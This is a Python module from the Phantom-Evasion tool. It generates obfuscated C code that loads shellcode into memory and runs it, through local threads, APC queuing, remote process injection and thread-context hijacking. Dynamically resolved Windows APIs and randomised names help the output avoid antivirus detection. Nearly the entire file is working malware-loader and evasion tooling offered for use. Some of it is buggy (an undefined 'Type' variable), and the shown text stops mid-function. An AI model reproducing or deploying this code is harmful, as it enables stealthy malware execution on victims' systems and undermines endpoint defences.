
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

from usefull import varname_creator
import random

def Win_MemLocal(ModOpt):

    Ret_code= ""

    if "Virtual" in ModOpt["MemAlloc"]:

        if ModOpt["MemAlloc"] == "Virtual_RW/RX" or ModOpt["MemAlloc"] == "Virtual_RW/RWX":
            prot="0x04"
        else:
            prot="0x40"

        if ModOpt["DynImport"] == True:
            NdcVirtualAlloc = varname_creator()
            Ret_code += "FARPROC " + NdcVirtualAlloc + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"VirtualAlloc\");\n"
            Ret_code += ModOpt["Lpvoid"] + " = (LPVOID) " + NdcVirtualAlloc + "(NULL," + ModOpt["Bufflen"] + ",0x00001000," + prot + ");\n"
        else:
            Ret_code += ModOpt["Lpvoid"] + " = VirtualAlloc(NULL," + ModOpt["Bufflen"] + ",0x00001000," + prot + ");\n"

    elif ModOpt["MemAlloc"] == "Heap_RWX":

        Randheaphandle = varname_creator()

        if ModOpt["DynImport"] == True:
            NdcHeapcreate = varname_creator()
            NdcHeapalloc = varname_creator()
            Ret_code += "FARPROC " + NdcHeapcreate + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"HeapCreate\");\n"
            Ret_code += "FARPROC " + NdcHeapalloc + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"HeapAlloc\");\n" 
            Ret_code += "HANDLE " + Randheaphandle + " = (HANDLE)" + NdcHeapcreate + "(0x00040000," + ModOpt["Bufflen"] + ",0);\n"
            Ret_code += ModOpt["Lpvoid"] + " = (LPVOID)" + NdcHeapalloc + "(" + Randheaphandle + ", 0x00000008," + ModOpt["Bufflen"] + ");\n"    
        else:
            Ret_code += "HANDLE " + Randheaphandle + " = HeapCreate(0x00040000," + ModOpt["Bufflen"] + ",0);\n"
            Ret_code += ModOpt["Lpvoid"] + " = HeapAlloc(" + Randheaphandle + ", 0x00000008," + ModOpt["Bufflen"] + ");\n"

    return Ret_code

def Win_MemRemote(ModOpt):

    Ret_code = ""

    if "Virtual" in ModOpt["MemAlloc"]:

        if ModOpt["MemAlloc"] == "Virtual_RWX":

            prot = "0x40"

        elif "RW/" in ModOpt["MemAlloc"]:

            prot = "0x04"

        if ModOpt["DynImport"] == True:

            NdcVirtualAllocEx = varname_creator()
            Ret_code += "FARPROC " + NdcVirtualAllocEx + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"VirtualAllocEx\");\n"
            Ret_code += ModOpt["Lpvoid2"] + " = (LPVOID)" + NdcVirtualAllocEx + "(" + ModOpt["ProcHandle"] + ",NULL," + ModOpt["Bufflen"] + ",0x00001000," + prot + ");\n"
        else:
            Ret_code += ModOpt["Lpvoid2"] + " = VirtualAllocEx(" + ModOpt["ProcHandle"] + ",NULL," + ModOpt["Bufflen"] + ",0x00001000," + prot + ");\n"

    elif ModOpt["MemAlloc"] in ["SharedSection","SS"]:

        NTCS_load = varname_creator()
        NTMVOS_load = varname_creator()
        Buff=ModOpt["Lpvoid"]

        if ModOpt["DynImport"] == False:

            ModOpt["NtdllHandle"] = varname_creator()

            Ret_code += "HANDLE " + ModOpt["NtdllHandle"] + " = GetModuleHandle(\"ntdll.dll\");\n"

        Ret_code += "SIZE_T size = 4096;\n"
        Ret_code += "LARGE_INTEGER sectionSize = { size };\n"
        Ret_code += "HANDLE sectionHandle = NULL;\n"
        Ret_code += "LPVOID local;\n"
        Ret_code += "FARPROC " + NTCS_load + " = GetProcAddress(" + ModOpt["NtdllHandle"] + ", \"NtCreateSection\");\n"
        Ret_code += NTCS_load + "(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);\n"
        #Ret_code += "NtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);\n"
        Ret_code += "FARPROC " + NTMVOS_load + " = GetProcAddress(" + ModOpt["NtdllHandle"] + ", \"NtMapViewOfSection\");\n"
        Ret_code += NTMVOS_load + "(sectionHandle, GetCurrentProcess(),&local, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);\n"

        Ret_code += NTMVOS_load + "(sectionHandle," + ModOpt["ProcHandle"] + ",&" + ModOpt["Lpvoid2"] + ", NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);\n"
        Ret_code += "unsigned char * " + ModOpt["Lpvoid"] + " = local;\n"
        if ModOpt["DynImport"] == True:
        
             Ndcrtlmovemem = varname_creator() 
             Ret_code += "FARPROC " + Ndcrtlmovemem + " = GetProcAddress(" + ModOpt["NtdllHandle"] + ", \"RtlMoveMemory\");\n"
             Ret_code += Ndcrtlmovemem + "(" + ModOpt["Lpvoid"] + "," + ModOpt["Buff"] + ",sizeof(" + ModOpt["Buff"] + ")-1);\n"
        else:
             Ret_code += "RtlMoveMemory(" + ModOpt["Lpvoid"] + "," + ModOpt["Buff"] + ",sizeof(" + ModOpt["Buff"] + ")-1);\n"

    return Ret_code

def Win_ChangeMemProtect(ModOpt):

    Ret_code = ""
    Oldprot = varname_creator()

    Ret_code += "DWORD " + Oldprot + ";\n"

    if "/RX" in ModOpt["MemAlloc"]:

        P_cost = "0x20"

    elif "/RWX" in ModOpt["MemAlloc"]:

        P_cost = "0x40"

    if ModOpt["ExecMethod"] == "Thread" or ModOpt["ExecMethod"] == "APC":

        if ModOpt["DynImport"] == True:
            NdcVirtualProtect = varname_creator()
            Ret_code += "FARPROC " + NdcVirtualProtect + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"VirtualProtect\");\n"
            Ret_code += NdcVirtualProtect + "(" + ModOpt["Lpvoid"] + "," + ModOpt["Bufflen"] + "," + P_cost + ",&" + Oldprot + ");\n"
        else:        

            Ret_code += "VirtualProtect(" + ModOpt["Lpvoid"] + "," + ModOpt["Bufflen"] + "," + P_cost + ",&" + Oldprot + ");\n"

    else:
        if ModOpt["DynImport"] == True:
            NdcVirtualProtectEx = varname_creator()
            Ret_code += "FARPROC " + NdcVirtualProtectEx + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"VirtualProtectEx\");\n"
            Ret_code += NdcVirtualProtectEx + "(" + ModOpt["ProcHandle"] + "," + ModOpt["Lpvoid2"] + "," + ModOpt["Bufflen"] + "," + P_cost + ",&" + Oldprot + ");\n"

        else:
            Ret_code += "VirtualProtectEx(" + ModOpt["ProcHandle"] + "," + ModOpt["Lpvoid2"] + "," + ModOpt["Bufflen"] + "," + P_cost + ",&" + Oldprot + ");\n"

    return Ret_code

def Win_MovMem(ModOpt):

    Ret_code = ""

    if Type == "RtlMoveMemory":
    
        Ret_code += "RtlMoveMemory(" + ModOpt["Lpvoid"] + "," + ModOpt["ShellBuffname"] + "," + ModOpt["Bufflen"] + ");\n"

    elif Type == "memcpy":

        Ret_code += "memcpy(" + ModOpt["Lpvoid"] + ",&" + ModOpt["ShellBuffname"] + "," + ModOpt["Bufflen"] + ");\n"

    return Ret_code

def ShellcodeHelper(ModOpt):

    Ret_code = ""

    if ModOpt["ShellRes"] == True:

        RandRes = varname_creator()

        if ModOpt["DynImport"] == True:

            NdcFindResource = varname_creator()
            NdcLoadResource = varname_creator()
            NdcSizeofResource = varname_creator()

            Ret_code += "FARPROC " + NdcFindResource + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"FindResource\");\n"            
            Ret_code += "HRSRC " + RandRes + " = (HRSRC)" + NdcFindResource + "(NULL, MAKEINTRESOURCE(\"" + ModOpt["ResType"] + "\"), \"" + ModOpt["ResType"] + "\");\n"
            Ret_code += "FARPROC " + NdcLoadResource + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"LoadResource\");\n"
            #Ret_code += "DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);\n"

            Ret_code += "HGLOBAL " + ModOpt["Buff"] + " = (HGLOBAL)" + NdcLoadResource + "(NULL," + RandRes + ");\n"
            Ret_code += "FARPROC " + NdcSizeofResource + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"SizeofResource\");\n"
            ModOpt["Bufflen"] = NdcSizeofResource + "(NULL," + RandRes + ")"

        else:

            Ret_code += "HRSRC " + RandRes + " = FindResource(NULL, MAKEINTRESOURCE(\"" + ModOpt["ResType"] + "\"), \"" + ModOpt["ResType"] + "\");\n"
            #Ret_code += "DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);\n"
            Ret_code += "HGLOBAL " + ModOpt["Buff"] + " = LoadResource(NULL," + RandRes + ");\n"
            ModOpt["Bufflen"] = "SizeofResource(NULL," + RandRes + ")"
    else:

        Ret_code += "unsigned char " + ModOpt["Buff"] + "[] = \"" + ModOpt["Payload"] + "\";\n"

        ModOpt["Bufflen"] = "sizeof(" + ModOpt["Buff"] + ")-1"
    
    return Ret_code

    
def Win_LocalThread(ModOpt):

    Ret_code = ""
    Randhand = varname_creator()
    Randresult = varname_creator()
    Ret_code += "HANDLE " + Randhand + ";\n"

    if ModOpt["ExecMethod"] == "Thread":

        Randthread = varname_creator()

        Ret_code += "DWORD " + Randthread + ";\n"

        if ModOpt["DynImport"] == True:
            NdcCreateThread = varname_creator()
            Ret_code += "FARPROC " + NdcCreateThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"CreateThread\");\n"
            Ret_code += Randhand + " = (HANDLE)" + NdcCreateThread + "(NULL,0,(LPVOID)" + ModOpt["Lpvoid"] + ",NULL,0,&" + Randthread + ");\n"        
        else:
            Ret_code += Randhand + " = CreateThread(NULL,0,(LPVOID)" + ModOpt["Lpvoid"] + ",NULL,0,&" + Randthread + ");\n"

    elif ModOpt["ExecMethod"] == "ThreadSR":

        Randthread = varname_creator()
        ResThread = varname_creator()

        if ModOpt["DynImport"] == True:
            NdcCreateThread = varname_creator()
            NdcResumeThread = varname_creator()
            Ret_code += "FARPROC " + NdcCreateThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"CreateThread\");\n"
            Ret_code += Randhand + " = (HANDLE)" + NdcCreateThread + "(NULL,0,(LPVOID)" + ModOpt["Lpvoid"] + ",NULL,0x00000004,&" + Randthread + ");\n"
            Ret_code += "FARPROC " + NdcResumeThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"ResumeThread\");\n"
            Ret_code += "DWORD " + ResThread + " = (DWORD)" + NdcResumeThread + "(" + Randhand + ");\n"
        else:
            Ret_code += "DWORD " + Randthread + ";\n"
            Ret_code += Randhand + " = CreateThread(NULL,0,(LPVOID)" + ModOpt["Lpvoid"] + ",NULL,0x00000004,&" + Randthread + ");\n"
            Ret_code += "DWORD " + ResThread + " = ResumeThread(" + Randhand + ");\n"

    elif ModOpt["ExecMethod"] == "NtThread":

        NTCT_load = varname_creator()

        Ret_code += "FARPROC " + NTCT_load + " = GetProcAddress(" + ModOpt["NtdllHandle"] + ", \"NtCreateThread\");\n"
        Ret_code += NTCT_load + "(&"+ Randhand + ", GENERIC_ALL, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)" + ModOpt["Lpvoid"] + ", NULL, NULL, NULL, NULL, NULL,NULL);"

    elif ModOpt["ExecMethod"] == "NtThreadSR":

        NTCT_load = varname_creator()
        ResThread = varname_creator()
        NdcResumeThread = varname_creator()

        Ret_code += "FARPROC " + NTCT_load + " = GetProcAddress(" + ModOpt["NtdllHandle"] + ", \"NtCreateThread\");\n"
        Ret_code += NTCT_load + "(&"+ Randhand + ", GENERIC_ALL, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)" + ModOpt["Lpvoid"] + ", NULL, NULL, NULL, NULL, NULL,TRUE);"
        Ret_code += "FARPROC " + NdcResumeThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"ResumeThread\");\n"
        Ret_code += "DWORD " + ResThread + " = (DWORD)" + NdcResumeThread + "(" + Randhand + ");\n"

    if ModOpt["ExecMethod"] == "APC":

        RandAPC = varname_creator()
        Ret_code += "PTHREAD_START_ROUTINE " + RandAPC + " = (PTHREAD_START_ROUTINE)" + ModOpt["Lpvoid"] + ";\n"

        if ModOpt["DynImport"] == True:

            QUAPC_load = varname_creator()
            SE_load = varname_creator()

            Ret_code += "FARPROC " + QUAPC_load + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"QueueUserAPC\");\n"
            Ret_code += "FARPROC " + SE_load + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"SleepEx\");\n"
            Ret_code += QUAPC_load + "((PAPCFUNC)" + RandAPC + ", GetCurrentThread(),(ULONG_PTR)NULL);\n"
            Ret_code += SE_load + "(-1,TRUE);\n"
        else:
            Ret_code += "QueueUserAPC((PAPCFUNC)" + RandAPC + ", GetCurrentThread(),(ULONG_PTR)NULL);\n"
            Ret_code += "SleepEx(-1,TRUE);\n"
    else:        
        if ModOpt["DynImport"] == True:

            NdcWaitForSingleObj = varname_creator()
            Ret_code += "FARPROC " + NdcWaitForSingleObj + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"WaitForSingleObject\");\n"
            Ret_code += "DWORD " + Randresult + " = " + NdcWaitForSingleObj + "(" + Randhand + ",-1);\n"
        else:
            Ret_code += "DWORD " + Randresult + " = WaitForSingleObject(" + Randhand + ",-1);\n"

    return Ret_code


def Win_RemoteThread(ModOpt):

    Ret_code = ""
    Randhand = varname_creator()
    Randresult = varname_creator()
    Ret_code += "HANDLE " + Randhand + ";\n"

    if ModOpt["ExecMethod"] == "ProcessInject" or ModOpt["ExecMethod"] == "ProcessInjectSR":

        Randthread = varname_creator()
        Ret_code += "DWORD " + Randthread + ";\n"

        if ModOpt["ExecMethod"] == "ProcessInject":

            threadval="0"
            
        elif ModOpt["ExecMethod"] == "ProcessInjectSR":

            threadval="0x00000004"

        if ModOpt["DynImport"] == True:
            NdcCreateRemoteThread = varname_creator()
            Ret_code += "FARPROC " + NdcCreateRemoteThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"CreateRemoteThread\");\n"
            Ret_code += NdcCreateRemoteThread + "(" + ModOpt["ProcHandle"] + ",NULL,0," + ModOpt["Lpvoid2"] + ",NULL," + threadval + ",&"+ Randthread + ");\n"

            if ModOpt["ExecMethod"] == "ProcessInjectSR":

                ResThread = varname_creator()
                NdcResumeThread = varname_creator()
                Ret_code += "FARPROC " + NdcResumeThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"ResumeThread\");\n"
                Ret_code += "DWORD " + ResThread + " = " + NdcResumeThread + "(" + Randhand + ");\n"

        else:
            Ret_code += "CreateRemoteThread(" + ModOpt["ProcHandle"] + ",NULL,0," + ModOpt["Lpvoid2"] + ",NULL," + threadval + ",&"+ Randthread + ");\n"

            if ModOpt["ExecMethod"] == "ProcessInjectSR":
                ResThread = varname_creator()
                Ret_code += "DWORD " + ResThread + " = ResumeThread(" + Randhand + ");\n"

    elif ModOpt["ExecMethod"] == "NtProcessInject" or ModOpt["ExecMethod"] == "NtProcessInjectSR":

        if ModOpt["ExecMethod"] == "NtProcessInject":

            threadval="NULL"
            
        elif ModOpt["ExecMethod"] == "NtProcessInjectSR":

            threadval="TRUE"

        NdcNtCreateThreadEx = varname_creator()
        Ret_code += "FARPROC " + NdcNtCreateThreadEx + " = GetProcAddress(" + ModOpt["NtdllHandle"] + ", \"NtCreateThreadEx\");\n"
        Ret_code += NdcNtCreateThreadEx + "(&"+ Randhand + ", GENERIC_ALL, NULL," + ModOpt["ProcHandle"] + ", (LPTHREAD_START_ROUTINE)" + ModOpt["Lpvoid2"] + ", NULL, NULL, NULL, NULL, NULL," + threadval + ");"

        if ModOpt["ExecMethod"] == "NtProcessInjectSR":

            ResThread = varname_creator()

            if ModOpt["DynImport"] == True: 
                NdcResumeThread = varname_creator()
                Ret_code += "FARPROC " + NdcResumeThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"ResumeThread\");\n"
                Ret_code += "DWORD " + ResThread + " = " + NdcResumeThread + "(" + Randhand + ");\n"       
            else:
                Ret_code += "DWORD " + ResThread + " = ResumeThread(" + Randhand + ");\n"

    if ModOpt["DynImport"] == True:
        NdcWaitForSingleObj = varname_creator()
        Ret_code += "FARPROC " + NdcWaitForSingleObj + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"WaitForSingleObject\");\n"
        Ret_code += "DWORD " + Randresult + " = " + NdcWaitForSingleObj + "(" + Randhand + ",-1);\n"
    else:
        Ret_code += "DWORD " + Randresult + " = WaitForSingleObject(" + Randhand + ",-1);\n"

    return Ret_code

def Win_RemoteInjection(ModOpt):

    Ret_code = ""
    RandhProcess = varname_creator()
    Randentry = varname_creator()
    RandProcsnapshot = varname_creator()
    Randlpv2 = varname_creator()
    
    ModOpt["ProcHandle"] = RandhProcess
    ModOpt["Lpvoid2"] = Randlpv2

    if ModOpt["ExecMethod"] in ["ThreadExecutionHijack","TEH","ProcessInject","PI","APCSpray","APCS"]:

        Ret_code += "PROCESSENTRY32 " + Randentry + ";\n"
        Ret_code += Randentry + ".dwSize = sizeof(PROCESSENTRY32);\n"


        if ModOpt["DynImport"] == True:

            NdcTl32Snapshot = varname_creator()
            NdcProcess32First = varname_creator()
            NdcProcess32Next = varname_creator()
            NdcOpenProcess = varname_creator()
            Ret_code += "FARPROC " + NdcTl32Snapshot + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"CreateToolhelp32Snapshot\");\n"
            Ret_code += "HANDLE " + RandProcsnapshot + " = (HANDLE)" + NdcTl32Snapshot + "(TH32CS_SNAPPROCESS, 0);\n"
            Ret_code += "FARPROC " + NdcProcess32First + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"Process32First\");\n"
            Ret_code += "FARPROC " + NdcProcess32Next + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"Process32Next\");\n"
            Ret_code += "FARPROC " + NdcOpenProcess + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"OpenProcess\");\n"
            Ret_code += "if (" + NdcProcess32First + "(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
            Ret_code += "while (" + NdcProcess32Next + "(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
            Ret_code += "if(strcmp(" + Randentry + ".szExeFile, \"" + ModOpt["ProcTarget"] + "\") == 0){\n"
            Ret_code += "HANDLE " + RandhProcess + " = (HANDLE)" + NdcOpenProcess + "(PROCESS_ALL_ACCESS, FALSE, " + Randentry + ".th32ProcessID);\n"
        else:
            Ret_code += "HANDLE " + RandProcsnapshot + " = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n"
            Ret_code += "if (Process32First(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
            Ret_code += "while (Process32Next(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
            Ret_code += "if(strcmp(" + Randentry + ".szExeFile, \"" + ModOpt["ProcTarget"] + "\") == 0){\n"
            Ret_code += "HANDLE " + RandhProcess + " = OpenProcess(PROCESS_ALL_ACCESS, FALSE, " + Randentry + ".th32ProcessID);\n"
        
        Ret_code += "if(" + RandhProcess + " != NULL){\n"

    if ModOpt["ExecMethod"] in ["ThreadExecutionHijack","TEH"]:
        
        RandThreadsnapshot = varname_creator()
        RandTargetThread = varname_creator()
        RandTentry = varname_creator()
        RandTcontext = varname_creator()
        RandThreadId = varname_creator()
        Randpidvar = varname_creator()
        Randinputvar = varname_creator()
        RandWindowHandle = varname_creator()

        Ret_code += "HANDLE " + RandThreadsnapshot + " = INVALID_HANDLE_VALUE;\n" 
        Ret_code += "THREADENTRY32 " + RandTentry + ";\n" 

        if ModOpt["DynImport"] == True:

            Ret_code += RandThreadsnapshot + " = (HANDLE)" + NdcTl32Snapshot + "( TH32CS_SNAPTHREAD, 0);\n"
        else:
            Ret_code += RandThreadsnapshot + " = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0);\n"
       
        Ret_code += "if(" + RandThreadsnapshot + " != INVALID_HANDLE_VALUE ) {\n"
        Ret_code += RandTentry + ".dwSize = sizeof(THREADENTRY32 );\n"

        if ModOpt["DynImport"] == True:

            User32 = varname_creator()
            NdcThread32First = varname_creator()
            NdcThread32Next = varname_creator()
            NdcOpenThread = varname_creator()
            NdcSuspendThread = varname_creator()
            NdcGetThreadContext = varname_creator()
            NdcCloseHandle = varname_creator()

            Ret_code += "HANDLE " + User32 + " = GetModuleHandle(\"user32.dll\");\n" # NON NECESSARIO??????????????
            Ret_code += "FARPROC " + NdcCloseHandle + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"CloseHandle\");\n"
            Ret_code += "FARPROC " + NdcThread32Next + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"Thread32Next\");\n"
            Ret_code += "FARPROC " + NdcThread32First + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"Thread32First\");\n"
            Ret_code += "FARPROC " + NdcOpenThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"OpenThread\");\n"
            Ret_code += "FARPROC " + NdcSuspendThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"SuspendThread\");\n"
            Ret_code += "FARPROC " + NdcGetThreadContext + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"GetThreadContext\");\n"
            Ret_code += "if(!" + NdcThread32First + "(" + RandThreadsnapshot + ", &" + RandTentry + " ) ){CloseHandle(" + RandThreadsnapshot + ");}\n"
            Ret_code += "do{\n" 
            Ret_code += "if(" + RandTentry + ".th32OwnerProcessID == " + Randentry + ".th32ProcessID ){\n"
            Ret_code += "HANDLE " + RandTargetThread + " = (HANDLE)" + NdcOpenThread + "(THREAD_ALL_ACCESS ,FALSE," + RandTentry + ".th32ThreadID);\n"
            Ret_code += "if(" + RandTargetThread + " != NULL){\n"
            Ret_code += NdcSuspendThread + "(" + RandTargetThread + ");\n"
            Ret_code += "CONTEXT " + RandTcontext + ";\n"
            Ret_code += RandTcontext +".ContextFlags = CONTEXT_FULL;\n"
            Ret_code += "if (" + NdcGetThreadContext + "(" + RandTargetThread + ", &" + RandTcontext + ") != 0){\n"
        else:
            Ret_code += "if(!Thread32First(" + RandThreadsnapshot + ", &" + RandTentry + " ) ){CloseHandle(" + RandThreadsnapshot + ");}\n"
            Ret_code += "do{\n" 
            Ret_code += "if(" + RandTentry + ".th32OwnerProcessID == " + Randentry + ".th32ProcessID ){\n"
            Ret_code += "HANDLE " + RandTargetThread + " = OpenThread(THREAD_ALL_ACCESS ,FALSE," + RandTentry + ".th32ThreadID);\n"
            Ret_code += "if(" + RandTargetThread + " != NULL){\n"
            Ret_code += "SuspendThread(" + RandTargetThread + ");\n"
            Ret_code += "CONTEXT " + RandTcontext + ";\n"
            Ret_code += RandTcontext +".ContextFlags = CONTEXT_FULL;\n"
            Ret_code += "if (GetThreadContext(" + RandTargetThread + ", &" + RandTcontext + ") != 0){\n"

        if ModOpt["Arch"] == "x64":

            Ret_code += RandTcontext + ".Rsp -= sizeof(unsigned int);\n"

            if ModOpt["DynImport"] == True:

                NdcWriteProcMem = varname_creator()
                Ret_code += "FARPROC " + NdcWriteProcMem + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"WriteProcessMemory\");\n"
                Ret_code += NdcWriteProcMem + "(" + RandhProcess + ", (LPVOID) " + RandTcontext + ".Rsp, (LPCVOID) &" + RandTcontext + ".Rip, sizeof(unsigned int), NULL);\n"

            else:
                Ret_code += "WriteProcessMemory(" + RandhProcess + ", (LPVOID) " + RandTcontext + ".Rsp, (LPCVOID) &" + RandTcontext + ".Rip, sizeof(unsigned int), NULL);\n"

        else:

            Ret_code += RandTcontext + ".Esp -= sizeof(unsigned int);\n"

            if ModOpt["DynImport"] == True:

                NdcWriteProcMem = varname_creator()
                Ret_code += "FARPROC " + NdcWriteProcMem + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"WriteProcessMemory\");\n"
                Ret_code += NdcWriteProcMem + "(" + RandhProcess + ", (LPVOID) " + RandTcontext + ".Esp, (LPCVOID) &" + RandTcontext + ".Eip, sizeof(unsigned int), NULL);\n"

            else:
                Ret_code += "WriteProcessMemory(" + RandhProcess + ", (LPVOID) " + RandTcontext + ".Esp, (LPCVOID) &" + RandTcontext + ".Eip, sizeof(unsigned int), NULL);\n"

        Ret_code += "LPVOID " + Randlpv2 + ";\n"

        Ret_code += Win_MemRemote(ModOpt)

        if ModOpt["Decoder"] != "False":

            Ret_code += ModOpt["Decoder"]

        if not ModOpt["MemAlloc"] in ["SS","SharedSection"]:

            if ModOpt["DynImport"] == True:

                Ret_code += NdcWriteProcMem + "(" + RandhProcess + "," + Randlpv2 + ", (LPCVOID)" + ModOpt["Buff"] + "," + ModOpt["Bufflen"] + ", NULL);\n"
            else:
                Ret_code += "WriteProcessMemory(" + RandhProcess + "," + Randlpv2 + ", (LPCVOID)" + ModOpt["Buff"] + "," + ModOpt["Bufflen"] + ", NULL);\n"

        if ModOpt["Arch"] =="x64":

            Ret_code += RandTcontext + ".Rip = (DWORD_PTR)" + Randlpv2 + ";\n"
        else:
            Ret_code += RandTcontext + ".Eip = (DWORD_PTR)" + Randlpv2 + ";\n"

        if ModOpt["DynImport"] == True:

            NdcSetThreadContext = varname_creator()
            Ret_code += "FARPROC " + NdcSetThreadContext + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"SetThreadContext\");\n"
            Ret_code += "if(" + NdcSetThreadContext + "(" + RandTargetThread + ", &" + RandTcontext + ") != 0){\n"

        else:
            Ret_code += "if(SetThreadContext(" + RandTargetThread + ", &" + RandTcontext + ") != 0){\n"

        if "RW/RX" in ModOpt["MemAlloc"] or "RW/RWX" in ModOpt["MemAlloc"]:

            Ret_code += Win_ChangeMemProtect(ModOpt)

        if ModOpt["DynImport"] == True:
            NdcResumeThread = varname_creator()
            NdcGetTopWindow = varname_creator()
            Ret_code += "FARPROC " + NdcResumeThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"ResumeThread\");\n"
            Ret_code += NdcResumeThread + "(" + RandTargetThread + ");\n"
            Ret_code += "FARPROC " + NdcGetTopWindow + " = GetProcAddress(" + User32 + ",\"GetTopWindow\");\n"
            Ret_code += "HWND " + RandWindowHandle + " = (HWND)" + NdcGetTopWindow + "(0);\n"
        else:
            Ret_code += "ResumeThread(" + RandTargetThread + ");\n"
            Ret_code += "HWND " + RandWindowHandle + " = GetTopWindow(0);\n"

        Ret_code += "while (" + RandWindowHandle + "){\n"
        Ret_code += "DWORD " + Randpidvar+ ";\n"

        if ModOpt["DynImport"] == True:

            NdcGetWindowThreadProcId = varname_creator()
            Ret_code += "FARPROC " + NdcGetWindowThreadProcId + " = GetProcAddress(" + User32 + ",\"GetWindowThreadProcessId\");\n"
            Ret_code += "DWORD " + RandThreadId + " = " + NdcGetWindowThreadProcId + "(" + RandWindowHandle + ", &" + Randpidvar + ");\n"
        else:
            Ret_code += "DWORD " + RandThreadId + " = GetWindowThreadProcessId(" + RandWindowHandle + ", &" + Randpidvar + ");\n"

        Ret_code += "if (" + Randpidvar+ " == " + Randentry + ".th32ProcessID){\n"
        Ret_code += "INPUT " + Randinputvar + ";\n"
        Ret_code += Randinputvar + ".type = INPUT_KEYBOARD;\n"
        Ret_code += Randinputvar + ".ki.wScan = 0;\n"
        Ret_code += Randinputvar + ".ki.time = 0;\n"
        Ret_code += Randinputvar + ".ki.dwExtraInfo = 0;\n"
        Ret_code += Randinputvar + ".ki.wVk = VK_CONTROL;\n"
        Ret_code += Randinputvar + ".ki.dwFlags = 0;\n" #0 for keypress

        if ModOpt["DynImport"] == True:

            NdcSendInput = varname_creator()
            NdcPostMessage = varname_creator()
            NdcGetNextWindow = varname_creator()

            Ret_code += "FARPROC " + NdcSendInput + " = GetProcAddress(" + User32 + ",\"SendInput\");\n"
            Ret_code += NdcSendInput + "(1, &" + Randinputvar + ", sizeof(INPUT));\n"
            Ret_code += "Sleep(" + str(random.randint(200,500)) + ");\n"
            Ret_code += "FARPROC " + NdcPostMessage + " = GetProcAddress(" + User32 + ",\"PostMessage\");\n"
            Ret_code += NdcPostMessage + "(" + RandWindowHandle + ", WM_KEYDOWN, 0x43, 0);\n"
            Ret_code += "Sleep(" + str(random.randint(200,500)) + ");\n"
            Ret_code += Randinputvar + ".ki.dwFlags = 2;\n"
            Ret_code += NdcSendInput + "(1, &" + Randinputvar + ", sizeof(INPUT));}\n"            
            Ret_code += "FARPROC " + NdcGetNextWindow + " = GetProcAddress(" + User32 + ",\"GetNextWindow\");\n"
            Ret_code += RandWindowHandle + " = (HWND)" + NdcGetNextWindow + "(" + RandWindowHandle + ", GW_HWNDNEXT);}\n"
            Ret_code += NdcCloseHandle + "(" + RandThreadsnapshot + ");" + NdcCloseHandle + "(" + RandProcsnapshot + ");\n"
